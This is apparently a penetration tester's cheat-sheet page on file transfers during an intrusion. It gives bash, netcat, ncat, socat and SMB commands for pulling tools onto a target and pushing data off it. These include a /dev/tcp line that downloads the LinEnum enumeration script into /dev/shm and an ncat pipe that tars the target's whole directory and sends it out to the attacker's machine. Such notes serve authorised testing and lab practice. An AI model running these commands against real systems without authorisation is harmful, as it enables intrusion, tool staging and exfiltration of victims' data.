# Linux File Transfers


## Bash 
Check `mount` if /`dev/shm/` has `no exec`
```bash
bash -c "cat < /dev/tcp/$IP/$PORT > /dev/shm/LinEnum.sh"
# bash -c 'If default shell is not bash'
```
[Ippsec Reddish Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM)

## Netcat
[[Netcat-Cheatsheet]]
```powershell
# Listener on Windows system
nc -lvnp $PORT > tranfered.exe
# Push wget.exe onto windows system
nc -nv $IP $PORT < /usr/share/windows-resources/binaries/wget.exe
```

## Ncat

Target machine
```bash
tar cf - . | ncat $IP $PORT
```
Attack machine
```bash
ncat -nlvp $PORT | tar xf -
```

## Socat
Use [[Socat-Cheatsheet]], Host with:
```bash
sudo socat TCP4-LISTEN:$PORT,fork file:$filename
```
Transfer with
```powershell
socat TCP4:$IP:$PORT file:$filename,create
```

## SMB Cif-Utils
```shell
sudo mount -t cifs -o 'user=$username,password=$password' //$IP/share /mnt/sharename
```

[Kali Cif-Utils]
